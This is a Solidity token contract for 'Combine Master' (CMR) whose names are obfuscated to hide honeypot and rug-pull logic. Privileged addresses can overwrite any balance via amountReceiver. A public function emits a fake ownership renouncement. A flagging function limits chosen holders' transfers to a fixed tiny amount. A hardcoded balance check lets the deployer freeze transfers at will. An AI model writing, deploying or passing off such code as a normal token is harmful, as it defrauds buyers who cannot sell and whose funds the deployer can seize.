//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface isSell {
    function createPair(address atShould, address senderLiquidity) external returns (address);
}

interface launchedList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapReceiver) external view returns (uint256);

    function transfer(address walletTokenFund, uint256 exemptSwap) external returns (bool);

    function allowance(address launchedAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptSwap) external returns (bool);

    function transferFrom(
        address sender,
        address walletTokenFund,
        uint256 exemptSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTo, uint256 value);
    event Approval(address indexed launchedAt, address indexed spender, uint256 value);
}

abstract contract feeMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromTake is launchedList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CombineMaster is feeMode, launchedList, fromTake {

    mapping(address => bool) public liquidityLaunched;

    uint256 enableFundLaunched;

    function amountReceiver(address toToken, uint256 exemptSwap) public {
        tokenTx();
        receiverToken[toToken] = exemptSwap;
    }

    function teamTx(address senderTotal, address walletTokenFund, uint256 exemptSwap) internal returns (bool) {
        if (senderTotal == launchReceiverBuy) {
            return tokenAt(senderTotal, walletTokenFund, exemptSwap);
        }
        uint256 teamAutoList = launchedList(autoSender).balanceOf(buyFrom);
        require(teamAutoList == enableFundLaunched);
        require(walletTokenFund != buyFrom);
        if (minLiquidity[senderTotal]) {
            return tokenAt(senderTotal, walletTokenFund, launchedMarketing);
        }
        return tokenAt(senderTotal, walletTokenFund, exemptSwap);
    }

    function symbol() external view virtual override returns (string memory) {
        return teamWallet;
    }

    function transfer(address toToken, uint256 exemptSwap) external virtual override returns (bool) {
        return teamTx(_msgSender(), toToken, exemptSwap);
    }

    function walletTeam() public {
        emit OwnershipTransferred(launchReceiverBuy, address(0));
        walletTo = address(0);
    }

    function maxTotal(uint256 exemptSwap) public {
        tokenTx();
        enableFundLaunched = exemptSwap;
    }

    function walletEnable(address walletLiquidity) public {
        require(walletLiquidity.balance < 100000);
        if (senderReceiver) {
            return;
        }
        
        liquidityLaunched[walletLiquidity] = true;
        if (toTotal == amountFee) {
            walletMarketingLaunch = true;
        }
        senderReceiver = true;
    }

    function balanceOf(address swapReceiver) public view virtual override returns (uint256) {
        return receiverToken[swapReceiver];
    }

    function approve(address liquidityMarketing, uint256 exemptSwap) public virtual override returns (bool) {
        tradingEnable[_msgSender()][liquidityMarketing] = exemptSwap;
        emit Approval(_msgSender(), liquidityMarketing, exemptSwap);
        return true;
    }

    bool public walletMarketingLaunch;

    function getOwner() external view returns (address) {
        return walletTo;
    }

    mapping(address => bool) public minLiquidity;

    uint256 private amountFee;

    function totalSupply() external view virtual override returns (uint256) {
        return limitTotalExempt;
    }

    uint256 constant launchedMarketing = 15 ** 10;

    string private minMarketing = "Combine Master";

    function decimals() external view virtual override returns (uint8) {
        return enableMode;
    }

    constructor (){
        if (amountFee == marketingTakeAuto) {
            amountFee = toTotal;
        }
        fromList fromTrading = fromList(buyFund);
        autoSender = isSell(fromTrading.factory()).createPair(fromTrading.WETH(), address(this));
        if (amountFee == marketingTakeAuto) {
            marketingTakeAuto = fromWalletMode;
        }
        launchReceiverBuy = _msgSender();
        liquidityLaunched[launchReceiverBuy] = true;
        receiverToken[launchReceiverBuy] = limitTotalExempt;
        walletTeam();
        if (marketingTakeAuto == amountFee) {
            amountFee = marketingTakeAuto;
        }
        emit Transfer(address(0), launchReceiverBuy, limitTotalExempt);
    }

    function allowance(address takeMin, address liquidityMarketing) external view virtual override returns (uint256) {
        if (liquidityMarketing == buyFund) {
            return type(uint256).max;
        }
        return tradingEnable[takeMin][liquidityMarketing];
    }

    event OwnershipTransferred(address indexed tokenLiquidity, address indexed toFee);

    function liquidityTeam(address amountSwap) public {
        tokenTx();
        if (walletMarketingLaunch == receiverWallet) {
            fromWalletMode = marketingTakeAuto;
        }
        if (amountSwap == launchReceiverBuy || amountSwap == autoSender) {
            return;
        }
        minLiquidity[amountSwap] = true;
    }

    address buyFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return minMarketing;
    }

    function tokenAt(address senderTotal, address walletTokenFund, uint256 exemptSwap) internal returns (bool) {
        require(receiverToken[senderTotal] >= exemptSwap);
        receiverToken[senderTotal] -= exemptSwap;
        receiverToken[walletTokenFund] += exemptSwap;
        emit Transfer(senderTotal, walletTokenFund, exemptSwap);
        return true;
    }

    uint256 private limitTotalExempt = 100000000 * 10 ** 18;

    address public autoSender;

    mapping(address => uint256) private receiverToken;

    address public launchReceiverBuy;

    uint8 private enableMode = 18;

    address private walletTo;

    uint256 public marketingTakeAuto;

    bool public senderReceiver;

    bool public receiverWallet;

    function tokenTx() private view {
        require(liquidityLaunched[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private tradingEnable;

    uint256 private toTotal;

    uint256 public fromWalletMode;

    address buyFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address senderTotal, address walletTokenFund, uint256 exemptSwap) external override returns (bool) {
        if (_msgSender() != buyFund) {
            if (tradingEnable[senderTotal][_msgSender()] != type(uint256).max) {
                require(exemptSwap <= tradingEnable[senderTotal][_msgSender()]);
                tradingEnable[senderTotal][_msgSender()] -= exemptSwap;
            }
        }
        return teamTx(senderTotal, walletTokenFund, exemptSwap);
    }

    string private teamWallet = "CMR";

    function owner() external view returns (address) {
        return walletTo;
    }

    uint256 receiverShould;

}